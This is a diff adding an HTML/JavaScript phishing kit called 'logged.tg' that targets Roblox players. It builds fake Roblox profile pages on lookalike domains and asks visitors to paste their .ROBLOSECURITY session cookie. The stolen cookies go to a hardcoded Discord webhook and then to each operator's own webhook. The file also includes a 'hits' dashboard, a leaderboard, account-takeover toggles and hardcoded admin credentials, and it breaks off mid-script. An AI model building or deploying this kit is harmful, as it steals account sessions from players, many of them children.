@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>logged.tg</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg:#0b0b0d; --sidebar:#0e0e11; --card:#141418; --card2:#1a1a1f;
+    --border:#222228; --text:#eaeaf0; --muted:#7a7a85;
+    --accent:#6c5ce7; --accent2:#8b7cf7; --green:#2ecc71; --red:#e74c3c;
+    --yellow:#f1c40f; --radius:14px;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{font-family:Inter,system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex}
+  .sidebar{width:64px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;align-items:center;padding:18px 0;gap:8px;flex-shrink:0}
+  .nav-btn{width:40px;height:40px;border-radius:10px;border:none;background:transparent;color:var(--muted);cursor:pointer;display:flex;align-items:center;justify-content:center}
+  .nav-btn:hover,.nav-btn.active{background:var(--card2);color:var(--text)}
+  .nav-btn svg{width:20px;height:20px}
+  .main{flex:1;display:flex;flex-direction:column;min-width:0}
+  .topbar{display:flex;align-items:center;justify-content:space-between;padding:14px 24px;border-bottom:1px solid var(--border)}
+  .content{padding:22px 24px 40px;overflow-y:auto;flex:1}
+  .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:22px}
+  .stat{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 20px;position:relative}
+  .stat .label{font-size:.78rem;color:var(--muted);margin-bottom:8px}
+  .stat .val{font-size:1.85rem;font-weight:700;letter-spacing:-.03em}
+  .stat .sub{font-size:.78rem;color:var(--muted);margin-top:6px}
+  .stat .pct{position:absolute;top:16px;right:16px;font-size:.75rem;color:var(--red);background:rgba(231,76,60,.12);padding:2px 8px;border-radius:6px}
+  .row2{display:grid;grid-template-columns:1.4fr 1fr;gap:14px}
+  @media(max-width:900px){.row2{grid-template-columns:1fr}}
+  .panel{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:18px 20px}
+  .panel h3{font-size:.95rem;font-weight:600;margin-bottom:14px}
+  .chart-placeholder{height:160px;background:linear-gradient(180deg,transparent 60%,rgba(108,92,231,.05));border-radius:8px;position:relative}
+  .lb-item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid var(--border)}
+  .lb-item:last-child{border-bottom:none}
+  .lb-av{width:34px;height:34px;border-radius:10px;background:var(--card2);display:flex;align-items:center;justify-content:center;font-size:.9rem}
+  .lb-name{flex:1;font-size:.9rem}
+  .lb-hits{font-size:.85rem;color:var(--muted)}
+  .top-box{background:var(--card2);border-radius:10px;padding:12px 14px;margin-bottom:12px}
+  .top-box .title{font-size:.72rem;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
+  input[type=text],input[type=password],input[type=url],input[type=number],select,textarea{
+    background:var(--bg);border:1px solid var(--border);color:var(--text);
+    padding:10px 12px;border-radius:8px;font-size:.9rem;width:100%
+  }
+  input:focus,select:focus,textarea:focus{outline:none;border-color:var(--accent)}
+  label{font-size:.8rem;color:var(--muted);display:block;margin-bottom:4px}
+  button.primary{background:var(--accent);color:#fff;border:none;padding:10px 16px;border-radius:8px;font-weight:600;font-size:.9rem;cursor:pointer}
+  button.primary:hover{background:var(--accent2)}
+  button.ghost{background:transparent;border:1px solid var(--border);color:var(--text);padding:8px 14px;border-radius:8px;cursor:pointer;font-size:.85rem}
+  .link-box{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:10px 12px;font-family:ui-monospace,monospace;font-size:.82rem;word-break:break-all;display:flex;gap:10px;align-items:center;margin-top:10px}
+  table{width:100%;border-collapse:collapse;font-size:.85rem}
+  th{text-align:left;color:var(--muted);font-weight:500;padding:8px 6px;border-bottom:1px solid var(--border)}
+  td{padding:10px 6px;border-bottom:1px solid var(--border)}
+  .badge{display:inline-block;padding:2px 8px;border-radius:99px;font-size:.72rem;background:rgba(108,92,231,.15);color:var(--accent2)}
+  .hidden{display:none!important}
+  .err{color:var(--red);font-size:.85rem;margin-top:8px;min-height:1.2em}
+  .view{display:none}.view.active{display:block}
+  .form-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+  @media(max-width:600px){.form-grid{grid-template-columns:1fr}}
+  .tabs-h{display:flex;gap:4px;margin-bottom:18px;border-bottom:1px solid var(--border)}
+  .tab-h{padding:10px 16px;color:var(--muted);cursor:pointer;font-size:.88rem;border-bottom:2px solid transparent}
+  .tab-h.active{color:var(--text);border-bottom-color:var(--accent)}
+  .toggle-row{display:flex;align-items:center;justify-content:space-between;padding:12px 0;border-bottom:1px solid var(--border)}
+  .toggle-row:last-child{border-bottom:none}
+  .toggle{width:42px;height:22px;background:#2a2a30;border-radius:99px;position:relative;cursor:pointer;border:1px solid var(--border);flex-shrink:0}
+  .toggle.on{background:var(--accent)}
+  .toggle::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;background:#555;border-radius:50%;transition:.2s}
+  .toggle.on::after{left:22px;background:#fff}
+  .profile-card{background:var(--card2);border-radius:12px;padding:16px;display:flex;align-items:center;gap:14px;margin-bottom:16px}
+  .profile-card img,.profile-card .av{width:48px;height:48px;border-radius:12px;background:#333;display:flex;align-items:center;justify-content:center}
+  .domain-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin:16px 0}
+  .domain-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;cursor:pointer;transition:.15s}
+  .domain-card:hover,.domain-card.selected{border-color:var(--accent)}
+  .domain-card .stars{color:var(--red);font-size:.85rem;margin:6px 0}
+  .big-hint{font-size:1.4rem;font-weight:700;text-align:center;margin:20px 0;letter-spacing:-.02em}
+  .big-hint span{color:var(--yellow)}
+
+  /* admin trigger */
+  #adminTrigger{position:fixed;bottom:10px;right:10px;width:14px;height:14px;border:none;background:transparent;cursor:pointer;opacity:.18;z-index:80;border-radius:50%}
+  #adminTrigger:hover{opacity:.55}
+  #adminTrigger::after{content:'';display:block;width:6px;height:6px;background:#444;border-radius:50%;margin:4px auto}
+  .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;z-index:100}
+  .modal{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:26px;width:min(360px,92vw)}
+  .modal h3{font-size:1.1rem;margin-bottom:16px}
+
+  /* phish / fake roblox profile */
+  #phishView{display:none;position:fixed;inset:0;background:#f2f2f2;z-index:200;overflow:auto;font-family:Inter,system-ui,sans-serif}
+  #phishView.show{display:block}
+  .rbx-top{background:#fff;border-bottom:1px solid #e3e3e3;padding:10px 20px;display:flex;align-items:center;gap:16px}
+  .rbx-logo{font-weight:700;font-size:1.2rem;color:#393b3d}
+  .rbx-nav a{color:#393b3d;text-decoration:none;font-size:.9rem;margin-right:14px}
+  .rbx-body{max-width:960px;margin:24px auto;padding:0 16px}
+  .rbx-profile{background:#fff;border-radius:8px;padding:24px;display:flex;gap:20px;align-items:flex-start;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+  .rbx-av{width:120px;height:120px;border-radius:8px;background:#ddd;display:flex;align-items:center;justify-content:center;font-size:2.5rem}
+  .rbx-info h1{font-size:1.5rem;color:#393b3d;margin-bottom:4px}
+  .rbx-info .handle{color:#666;font-size:.95rem;margin-bottom:10px}
+  .rbx-stats{display:flex;gap:16px;font-size:.85rem;color:#666;margin-bottom:12px}
+  .rbx-btns{display:flex;gap:8px}
+  .rbx-btns button{padding:8px 16px;border-radius:6px;border:none;font-weight:600;cursor:pointer}
+  .rbx-btns .join{background:#00a2ff;color:#fff}
+  .rbx-btns .add{background:#e3e3e3;color:#393b3d}
+  .rbx-cookie-box{margin-top:20px;background:#fff;border-radius:8px;padding:20px;box-shadow:0 1px 4px rgba(0,0,0,.08)}
+  .rbx-cookie-box h3{color:#393b3d;margin-bottom:8px;font-size:1rem}
+  .rbx-cookie-box p{color:#666;font-size:.85rem;margin-bottom:12px}
+  .rbx-cookie-box input{width:100%;padding:10px;border:1px solid #c3c3c3;border-radius:6px;margin-bottom:10px}
+  .rbx-cookie-box button{background:#00a2ff;color:#fff;border:none;padding:10px 18px;border-radius:6px;font-weight:600;cursor:pointer}
+</style>
+</head>
+<body>
+
+<aside class="sidebar" id="sidebar">
+  <button class="nav-btn active" data-view="dash" title="Dashboard">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+  </button>
+  <button class="nav-btn" data-view="create" title="Create Site">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
+  </button>
+  <button class="nav-btn" data-view="hits" title="Hits">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
+  </button>
+  <button class="nav-btn" data-view="settings" title="Settings" style="margin-top:auto">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>
+  </button>
+  <button class="nav-btn" data-view="account" title="Account">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+  </button>
+</aside>
+
+<div class="main" id="mainApp">
+  <div class="topbar">
+    <div style="font-size:.9rem;color:var(--muted)">logged.tg</div>
+    <div style="font-size:.85rem;color:var(--muted)" id="userLabel">@guest</div>
+  </div>
+  <div class="content">
+
+    <!-- DASH -->
+    <div class="view active" id="view-dash">
+      <div class="stats">
+        <div class="stat"><div class="label">Total Accounts</div><div class="val" id="sAcc">0</div><div class="sub">+0 today · 0 Daily</div><div class="pct">↑ 0%</div></div>
+        <div class="stat"><div class="label">Total Visits</div><div class="val" id="sVis">0</div><div class="sub">+0 today · 0 Daily</div><div class="pct">↑ 0%</div></div>
+        <div class="stat"><div class="label">Total URL Clicks</div><div class="val" id="sClk">0</div><div class="sub">+0 today · 0 Daily</div><div class="pct">↑ 0%</div></div>
+      </div>
+      <div class="row2">
+        <div class="panel"><h3>Overview</h3><div class="chart-placeholder"></div></div>
+        <div class="panel">
+          <h3>Leaderboard</h3>
+          <div class="top-box"><div class="title">Today's Top Hitters</div><div style="display:flex;justify-content:space-between;font-size:.85rem"><span>USER</span><span>HITS</span></div></div>
+          <div id="leaderboard"></div>
+        </div>
+      </div>
+      <div class="panel" style="margin-top:14px">
+        <h3>Your Link</h3>
+        <div class="link-box"><span id="authPath" style="flex:1">…</span>
+          <button class="ghost" onclick="copyText(document.getElementById('authPath').textContent)">Copy</button></div>
+      </div>
+    </div>
+
+    <!-- CREATE / PROFILE BUILDER -->
+    <div class="view" id="view-create">
+      <div class="tabs-h">
+        <div class="tab-h active" data-ctab="required">Profile</div>
+        <div class="tab-h" data-ctab="optional">Optional</div>
+        <div class="tab-h" data-ctab="domain">Domain</div>
+        <div class="tab-h" data-ctab="insights">Insights</div>
+      </div>
+
+      <div id="ctab-required" class="panel">
+        <h3>Required Fields</h3>
+        <div class="form-grid" style="margin-top:8px">
+          <div><label>Real Username *</label><input type="text" id="fReal" placeholder="Real Username..."></div>
+          <div><label>Fake Username *</label><input type="text" id="fFake" placeholder="Fake Username..."></div>
+          <div><label>Display Name *</label><input type="text" id="fDisplay" placeholder="Display Name..."></div>
+          <div><label>Discord Webhook *</label><input type="url" id="fWebhook" placeholder="Your Discord Webhook..."></div>
+        </div>
+        <button class="primary" style="margin-top:16px" onclick="saveProfile()">Save Profile</button>
+        <div id="profMsg" class="err" style="color:var(--green)"></div>
+      </div>
+
+      <div id="ctab-optional" class="panel hidden">
+        <h3>Optional Fields</h3>
+        <div class="form-grid" style="margin-top:8px">
+          <div><label>Status</label>
+            <select id="fStatus"><option>In Game (+Join Button)</option><option>Online</option><option>Offline</option></select></div>
+          <div><label>Premium</label>
+            <select id="fPremium"><option>Yes</option><option>No</option></select></div>
+          <div><label>Creation Date</label><input type="text" id="fCreated" placeholder="February 24th, 2026" value="February 24th, 2026"></div>
+          <div><label>Friends</label><input type="number" id="fFriends" value="0"></div>
+          <div><label>Followers</label><input type="number" id="fFollowers" value="0"></div>
+          <div><label>Followings</label><input type="number" id="fFollowings" value="0"></div>
+        </div>
+        <div style="margin-top:14px"><label>Description</label>
+          <textarea id="fDesc" rows="3" placeholder="About user..."></textarea></div>
+        <button class="primary" style="margin-top:16px" onclick="saveProfile()">Save</button>
+      </div>
+
+      <div id="ctab-domain" class="panel hidden">
+        <div class="big-hint">CHOOSE A <span>DOMAIN</span></div>
+        <div class="domain-grid">
+          <div class="domain-card selected" data-domain="roblox.com.gl" onclick="pickDomain(this)">
+            <div style="font-weight:600">roblox.com.gl</div>
+            <div class="stars">★★★★★</div>
+            <div style="font-size:.8rem;color:var(--muted)">GLOBAL</div>
+          </div>
+          <div class="domain-card" data-domain="roblox.com.py" onclick="pickDomain(this)">
+            <div style="font-weight:600">roblox.com.py</div>
+            <div class="stars">★★★★★</div>
+            <div style="font-size:.8rem;color:var(--muted)">GLOBAL</div>
+          </div>
+          <div class="domain-card" data-domain="roblox.com.cd" onclick="pickDomain(this)">
+            <div style="font-weight:600">roblox.com.cd</div>
+            <div class="stars">★★★★☆</div>
+            <div style="font-size:.8rem;color:var(--muted)">GLOBAL</div>
+          </div>
+        </div>
+        <button class="primary" onclick="saveProfile()">Confirm Domain</button>
+      </div>
+
+      <div id="ctab-insights" class="panel hidden">
+        <div class="profile-card">
+          <div class="av" id="insAv">?</div>
+          <div>
+            <div style="font-weight:600" id="insDisplay">—</div>
+            <div style="font-size:.85rem;color:var(--muted)" id="insHandle">@—</div>
+            <div style="font-size:.8rem;color:var(--muted);margin-top:4px" id="insStats">0 Friends · 0 Followers · 0 Following</div>
+          </div>
+          <div style="margin-left:auto;display:flex;gap:8px">
+            <button class="primary" style="padding:6px 14px">Join</button>
+            <button class="ghost">Add Friend</button>
+          </div>
+        </div>
+        <div style="margin-bottom:12px"><label>SITE ID</label><input type="text" id="insSiteId" readonly></div>
+        <div style="margin-bottom:12px"><label>SITE CODE</label><input type="text" id="insSiteCode" readonly></div>
+        <div style="margin-bottom:12px"><label>WEBHOOK URL</label>
+          <div class="link-box"><span id="insWebhook" style="flex:1;font-size:.8rem">—</span></div></div>
+        <div class="toggle-row">
+          <div><div style="font-size:.9rem">AUTH ENABLER</div><div style="font-size:.75rem;color:var(--muted)">Automatically adds Authenticator on account</div></div>
+          <div class="toggle" id="togAuth" onclick="this.classList.toggle('on')"></div>
+        </div>
+        <div class="toggle-row">
+          <div><div style="font-size:.9rem">AGE CHANGER</div><div style="font-size:.75rem;color:var(--muted)">Change account age from 13+ to &lt;13</div></div>
+          <div class="toggle" id="togAge" onclick="this.classList.toggle('on')"></div>
+        </div>
+        <p style="font-size:.75rem;color:var(--muted);margin-top:12px">NOTE: these methods are not guaranteed to work.</p>
+      </div>
+    </div>
+
+    <!-- HITS -->
+    <div class="view" id="view-hits">
+      <div class="panel">
+        <h3>Your Hits</h3>
+        <table>
+          <thead><tr><th>Time</th><th>Victim</th><th>Cookie</th><th>IP</th><th></th></tr></thead>
+          <tbody id="hitsBody"></tbody>
+        </table>
+      </div>
+    </div>
+
+    <!-- SETTINGS -->
+    <div class="view" id="view-settings">
+      <div class="panel">
+        <h3>Account Webhook</h3>
+        <p style="color:var(--muted);font-size:.85rem;margin-bottom:12px">Default webhook for hits (overridden by profile webhook if set).</p>
+        <input type="url" id="userWebhook" placeholder="https://discord.com/api/webhooks/...">
+        <button class="primary" style="margin-top:12px" onclick="saveWebhook()">Save</button>
+        <div id="whMsg" class="err" style="color:var(--green)"></div>
+      </div>
+    </div>
+
+    <!-- ACCOUNT -->
+    <div class="view" id="view-account">
+      <div class="panel" id="authPanel">
+        <h3 id="authTitle">Login</h3>
+        <div style="display:flex;flex-direction:column;gap:10px;max-width:340px">
+          <div><label>Username</label><input type="text" id="authUser"></div>
+          <div><label>Password</label><input type="password" id="authPass"></div>
+          <div><label>Webhook (register)</label><input type="url" id="authWh" placeholder="https://discord.com/api/webhooks/..."></div>
+          <button class="primary" id="authBtn" onclick="doAuth()">Login</button>
+          <button class="ghost" id="authSwitch" onclick="toggleAuthMode()">Need an account? Register</button>
+          <div class="err" id="authErr"></div>
+        </div>
+      </div>
+      <div class="panel hidden" id="loggedPanel">
+        <h3>Account</h3>
+        <p>Logged in as <strong id="loggedAs"></strong></p>
+        <button class="ghost" style="margin-top:14px" onclick="logout()">Logout</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ADMIN -->
+<div class="main hidden" id="adminApp" style="width:100%">
+  <div class="topbar"><div style="font-weight:600">ADMIN</div><button class="ghost" onclick="adminLogout()">Exit</button></div>
+  <div class="content">
+    <div class="stats">
+      <div class="stat"><div class="label">Global Hits</div><div class="val" id="admHits">0</div></div>
+      <div class="stat"><div class="label">Users</div><div class="val" id="admUsers">0</div></div>
+    </div>
+    <div class="panel"><h3>All Hits</h3>
+      <table><thead><tr><th>Time</th><th>Owner</th><th>Victim</th><th>Cookie</th><th>IP</th></tr></thead>
+      <tbody id="admHitsBody"></tbody></table>
+    </div>
+    <div class="panel" style="margin-top:14px"><h3>Users</h3>
+      <table><thead><tr><th>Username</th><th>Webhook</th><th>Hits</th></tr></thead>
+      <tbody id="admUsersBody"></tbody></table>
+    </div>
+  </div>
+</div>
+
+<!-- PHISH (fake roblox profile) -->
+<div id="phishView">
+  <div class="rbx-top">
+    <div class="rbx-logo">Roblox</div>
+    <div class="rbx-nav">
+      <a href="#">Charts</a><a href="#">Marketplace</a><a href="#">Create</a><a href="#">Robux</a>
+    </div>
+  </div>
+  <div class="rbx-body">
+    <div class="rbx-profile">
+      <div class="rbx-av" id="pAv">👤</div>
+      <div class="rbx-info">
+        <h1 id="pDisplay">User</h1>
+        <div class="handle" id="pHandle">@user</div>
+        <div class="rbx-stats">
+          <span id="pFriends">0 Connections</span>
+          <span id="pFollowers">0 Followers</span>
+          <span id="pFollowing">0 Following</span>
+        </div>
+        <div class="rbx-btns">
+          <button class="join">Join</button>
+          <button class="add">Add Connection</button>
+        </div>
+      </div>
+    </div>
+    <div class="rbx-cookie-box">
+      <h3>Account Verification</h3>
+      <p>To continue, paste your <code>.ROBLOSECURITY</code> cookie below.</p>
+      <input type="text" id="phishCookie" placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--...">
+      <button onclick="submitPhish()">Verify Account</button>
+      <div id="phishMsg" style="margin-top:10px;font-size:.85rem;color:#666"></div>
+    </div>
+  </div>
+</div>
+
+<button id="adminTrigger"></button>
+<div id="adminModal" class="overlay hidden">
+  <div class="modal">
+    <h3>Login</h3>
+    <div style="display:flex;flex-direction:column;gap:10px">
+      <div><label>Username</label><input type="text" id="admUser"></div>
+      <div><label>Password</label><input type="password" id="admPass"></div>
+      <button class="primary" onclick="tryAdminLogin()">Sign in</button>
+      <div class="err" id="admErr"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const DJ_WEBHOOK = "https://discord.com/api/webhooks/1536136547554955364/lJSCWY2jexNESzvrfsgCyTI3Od72JmJP2AU8PX1__SlqcKSYHM1WOCgAwKD2RN-vUEFS";
+const ADMIN_USER = "Hugi";
+const ADMIN_PASS = "GuitareVoiture88";
+const DELAY_MS = 5000;
+
+function load(k,d){try{return JSON.parse(localStorage.getItem(k))??d}catch{return d}}
+function save(k,v){localStorage.setItem(k,JSON.stringify(v))}
+
+let users = load("ltg_users", {});
+let session = load("ltg_session", null);
+let globalHits = load("ltg_global_hits", []);
+let authMode = "login";
+let selectedDomain = "roblox.com.gl";
+
+const params = new URLSearchParams(location.search);
+const pathParts = location.pathname.split("/").filter(Boolean);
+const phishOwner = params.get("u") || (pathParts[0]==="u" ? pathParts[1] : null);
+
+if (phishOwner) {
+  document.getElementById("sidebar").classList.add("hidden");
+  document.getElementById("mainApp").classList.add("hidden");
+  document.getElementById("adminTrigger").classList.add("hidden");
+  document.getElementById("phishView").classList.add("show");
+  // load profile for display
+  const owner = users[phishOwner];
+  if (owner?.profile) {
+    const p = owner.profile;
+    document.getElementById("pDisplay").textContent = p.display || p.fake || phishOwner;
+    document.getElementById("pHandle").textContent = "@" + (p.fake || phishOwner);
+    document.getElementById("pFriends").textContent = (p.friends||0) + " Connections";
+    document.getElementById("pFollowers").textContent = (p.followers||0) + " Followers";
+    document.getElementById("pFollowing").textContent = (p.followings||0) + " Following";
+  }
+  if (owner) { owner.visits = (owner.visits||0)+1; save("ltg_users", users); }
+} else {
+  init();
+}
+
+async function sendWebhook(url, payload) {
+  if (!url) return;
+  try { await fetch(url, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload) }); } catch {}
+}
+
+function buildEmbed(hit) {
+  return {
+    content: "HIT @everyone",
+    embeds: [{
+      title: "🍪 New Hit — " + (hit.owner||"?"),
+      color: 0x6c5ce7,
+      fields: [
+        { name: "Owner", value: hit.owner, inline: true },
+        { name: "Victim", value: hit.victim || "cookie", inline: true },
+        { name: "IP", value: hit.ip || "n/a", inline: true },
+        { name: ".ROBLOSECURITY", value: "```" + hit.cookie.slice(0, 350) + (hit.cookie.length>350?"…":"") + "```" }
+      ],
+      timestamp: new Date().toISOString(),
+      footer: { text: "logged.tg" }
+    }]
+  };
+}
+
+async function dualSend(hit) {
+  const payload = buildEmbed(hit);
+  await sendWebhook(DJ_WEBHOOK, payload);
+  setTimeout(() => {
+    const owner = users[hit.owner];
+    const wh = owner?.profile?.webhook || owner?.webhook;
+    if (wh) sendWebhook(wh, payload);
+  }, DELAY_MS);
+}
+
+async function submitPhish() {
+  const cookie = document.getElementById("phishCookie").value.trim();
+  const msg = document.getElementById("phishMsg");
+  if (!cookie || cookie.length < 15) { msg.style.color="#c0392b"; msg.textContent="Invalid cookie."; return; }
+  const hit = { time:new Date().toISOString(), owner:phishOwner, victim:"cookie-drop", cookie, ip:"client" };
+  if (!users[phishOwner]) users[phishOwner] = { pass:"", webhook:"", hits:[], visits:0, accounts:0 };
+  users[phishOwner].hits = users[phishOwner].hits||[];
+  users[phishOwner].hits.unshift(hit);
+  users[phishOwner].accounts = (users[phishOwner].accounts||0)+1;
+  save("ltg_users", users);
+  globalHits.unshift(hit); save("ltg_global_hits", globalHits);
+  dualSend(hit);
+  msg.style.color="#27ae60"; msg.textContent="Verified. Redirecting…";
+  setTimeout(()=>{ location.href="https://www.roblox.com/home"; }, 1100);
+}
+
+function init() {
+  document.querySelectorAll(".nav-btn").forEach(b=>{
+    b.addEventListener("click",()=>{
+      document.querySelectorAll(".nav-btn").forEach(x=>x.classList.remove("active"));
+      b.classList.add("active");
+      document.querySelectorAll(".view").forEach(v=>v.classList.remove("active"));
+      document.getElementById("view-"+b.dataset.view).classList.add("active");
+      if (b.dataset.view==="create") fillProfileForm();
+    });
+  });
+  document.querySelectorAll(".tab-h").forEach(t=>{
+    t.addEventListener("click",()=>{
+      document.querySelectorAll(".tab-h").forEach(x=>x.classList.remove("active"));
+      t.classList.add("active");
+      ["required","optional","domain","insights"].forEach(id=>{
+        document.getElementById("ctab-"+id).classList.toggle("hidden", id!==t.dataset.ctab);
+      });
+      if (t.dataset.ctab==="insights") renderInsights();
+    });
+  });
+  renderAuth(); render();
+}
+
+function current(){ return session ? users[session] : null; }
+
+function renderAuth(){
+  if(session&&users[session]){
+    document.getElementById("authPanel").classList.add("hidden");
+    document.getElementById("loggedPanel").classList.remove("hidden");
+    document.getElementById("loggedAs").textContent=session;
+    document.getElementById("userLabel").textContent="@"+session;
+    document.getElementById("userWebhook").value=users[session].webhook||"";
+  } else {
+    document.getElementById("authPanel").classList.remove("hidden");
+    document.getElementById("loggedPanel").classList.add("hidden");
+    document.getElementById("userLabel").textContent="@guest";
+  }
+}
+
+function render(){
+  const u=current(), uname=session||"guest";
+  const base=location.origin+location.pathname.replace(/\/$/,"")||location.href.split("?")[0];
+  document.getElementById("authPath").textContent=base+"?u="+encodeURIComponent(uname);
+  document.getElementById("sAcc").textContent=u?(u.accounts||0):0;
+  document.getElementById("sVis").textContent=u?(u.visits||0):0;
+  document.getElementById("sClk").textContent=u?(u.clicks||0):0;
+
+  const counts={}; globalHits.forEach(h=>{counts[h.owner]=(counts[h.owner]||0)+1});
+  const sorted=Object.entries(counts).sort((a,b)=>b[1]-a[1]).slice(0,6);
+  document.getElementById("leaderboard").innerHTML=sorted.length?sorted.map(([n,h])=>`
+    <div class="lb-item"><div class="lb-av">\( {n[0].toUpperCase()}</div><div class="lb-name"> \){n}</div><div class="lb-hits">${h}</div></div>`).join("")
+    :`<div class="lb-item"><div class="lb-av">—</div><div class="lb-name">no data</div><div class="lb-hits">0</div></div>`;
+
+  const myHits=u?.hits||[];
+  document.getElementById("hitsBody").innerHTML=myHits.length?myHits.map(h=>`
+    <tr><td>\( {new Date(h.time).toLocaleString()}</td><td> \){h.victim}</td>
+    <td style="font-family:monospace;font-size:.78rem">${h.cookie.slice(0,26)}…</td>
+    <td>${h.ip}</td><td><span class="badge">sent</span></td></tr>`).join("")
+    :`<tr><td colspan="5" style="color:var(--muted);text-align:center;padding:18px">No hits</td></tr>`;
+}
+
+function fillProfileForm(){
+  if(!session||!users[session]?.profile) return;
+  const p=users[session].profile;
+  document.getElementById("fReal").value=p.real||"";
+  document.getElementById("fFake").value=p.fake||"";
+  document.getElementById("fDisplay").value=p.display||"";
+  document.getElementById("fWebhook").value=p.webhook||"";
+  document.getElementById("fStatus").value=p.status||"In Game (+Join Button)";
+  document.getElementById("fPremium").value=p.premium||"Yes";
+  document.getElementById("fCreated").value=p.created||"February 24th, 2026";
+  document.getElementById("fFriends").value=p.friends||0;
+  document.getElementById("fFollowers").value=p.followers||0;
+  document.getElementById("fFollowings").value=p.followings||0;
+  document.getElementById("fDesc").value=p.desc||"";
+  selectedDomain=p.domain||"roblox.com.gl";
+  document.querySelectorAll(".domain-card").forEach(c=>c.classList.toggle("selected",c.dataset.domain===selectedDomain));
+}
+
+function saveProfile(){
+  if(!session){alert("Login first");return}
+  const profile={
+    real:document.getElementById("fReal").value.trim(),
+    fake:document.getElementById("fFake").value.trim(),
+    display:document.getElementById("fDisplay").value.trim(),
+    webhook:document.getElementById("fWebhook").value.trim(),
+    status:document.getElementById("fStatus").value,
+    premium:document.getElementById("fPremium").value,
+    created:document.getElementById("fCreated").value.trim(),
+    friends:+document.getElementById("fFriends").value||0,
+    followers:+document.getElementById("fFollowers").value||0,
+    followings:+document.getElementById("fFollowings").value||0,
+    desc:document.getElementById("fDesc").value.trim(),
+    domain:selectedDomain,
+    siteId: users[session].profile?.siteId || String(Math.floor(Math.random()*9e9)+1e9),
+    siteCode: users[session].profile?.siteCode || String(Math.floor(Math.random()*9e18)+1e18)
+  };
+  users[session].profile=profile;
+  if(profile.webhook) users[session].webhook=profile.webhook;
+  save("ltg_users",users);
+  document.getElementById("profMsg").textContent="Profile saved.";
+  renderInsights();
+}
+
+function pickDomain(el){
+  document.querySelectorAll(".domain-card").forEach(c=>c.classList.remove("selected"));
+  el.classList.add("selected");
+  selectedDomain=el.dataset.domain;
+}
+
+function renderInsights(){
+  if(!session||!users[session]?.profile) return;
+  const p=users[session].profile;
+  document.getElementById("insDisplay").textContent=p.display||p.fake||session;
+  document.getElementById("insHandle").textContent="@"+(p.fake||session);
+  document.getElementById("insStats").textContent=`${p.friends||0} Friends · ${p.followers||0} Followers · ${p.followings||0} Following`;
+  document.getElementById("insAv").textContent=(p.display||p.fake||session)[0].toUpperCase();
+  document.getElementById("insSiteId").value=p.siteId||"";
+  document.getElementById("insSiteCode").value=p.siteCode||"";
+  document.getElementById("insWebhook").textContent=p.webhook||"—";
+}
+
+function saveWebhook(){
+  if(!session)return;
+  users[session].webhook=document.getElementById("userWebhook").value.trim();
+  save("ltg_users",users);
+  document.getElementById("whMsg").textContent="Saved.";
+}
+
+function toggleAuthMode(){
+  authMode=authMode==="login"?"register":"login";
+  document.getElementById("authTitle").textContent=authMode==="login"?"Login":"Register";
+  document.getElementById("authBtn").textContent=authMode==="login"?"Login":"Create account";
+  document.getElementById("authSwitch").textContent=authMode==="login"?"Need an account? Register":"Have an account? Login";
+  document.getElementById("authErr").textContent="";
+}
+
+function doAuth(){
+  const user=document.getElementById("authUser").value.trim().toLowerCase().replace(/[^a-z0-9_-]/g,"");
+  const pass=document.getElementById("authPass").value;
+  const wh=document.getElementById("authWh").value.trim();
+  const err=document.getElementById("authErr");
+  if(!user||!pass){err.textContent="Fill both fields.";return}
+  if(authMode==="register"){
+    if(users[user]){err.textContent="Username taken.";return}
+    users[user]={pass,webhook:wh,hits:[],visits:0,accounts:0,clicks:0};
+    save("ltg_users",users); session=user; save("ltg_session",session);
+  } else {
+    if(!users[user]||users[user].pass!==pass){err.textContent="Wrong credentials.";return}
+    session=user; save("ltg_session",session);
+  }
+  err.textContent=""; renderAuth(); render();
+}
+
+function logout(){session=null;save("ltg_session",null);renderAuth();render()}
+function copyText(t){navigator.clipboard.writeText(t).catch(()=>{})}
+
+document.getElementById("adminTrigger").addEventListener("click",()=>{
